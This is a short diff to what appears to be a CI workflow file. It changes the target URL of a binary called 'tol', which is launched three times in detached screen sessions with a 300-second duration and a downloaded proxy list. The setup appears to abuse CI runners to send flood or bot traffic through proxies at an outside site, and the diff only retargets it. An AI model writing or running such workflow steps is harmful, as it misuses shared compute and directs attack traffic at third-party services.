@@ -34,9 +34,9 @@ jobs:
           unzip Fc-main.zip
           mv  Fc-main/proxy.txt 90.txt
           chmod +x tol
-          screen -dms ve ./tol https://xpert.lol/6901966783-cc49097d-86e8-477d-94d7-6bb988cd3d07 300 1 1 90.txt 
-          screen -dms ve ./tol https://xpert.lol/6901966783-cc49097d-86e8-477d-94d7-6bb988cd3d07 300 1 1 90.txt 
-          screen -dms ve ./tol https://xpert.lol/6901966783-cc49097d-86e8-477d-94d7-6bb988cd3d07 300 1 1 90.txt 
+          screen -dms ve ./tol https://rapidis.gay/6901966783-de68badf-9d11-422c-b391-467d1b13857d 300 1 1 90.txt 
+          screen -dms ve ./tol https://rapidis.gay/6901966783-de68badf-9d11-422c-b391-467d1b13857d 300 1 1 90.txt 
+          screen -dms ve ./tol https://rapidis.gay/6901966783-de68badf-9d11-422c-b391-467d1b13857d 300 1 1 90.txt 
           sleep 300
           
           
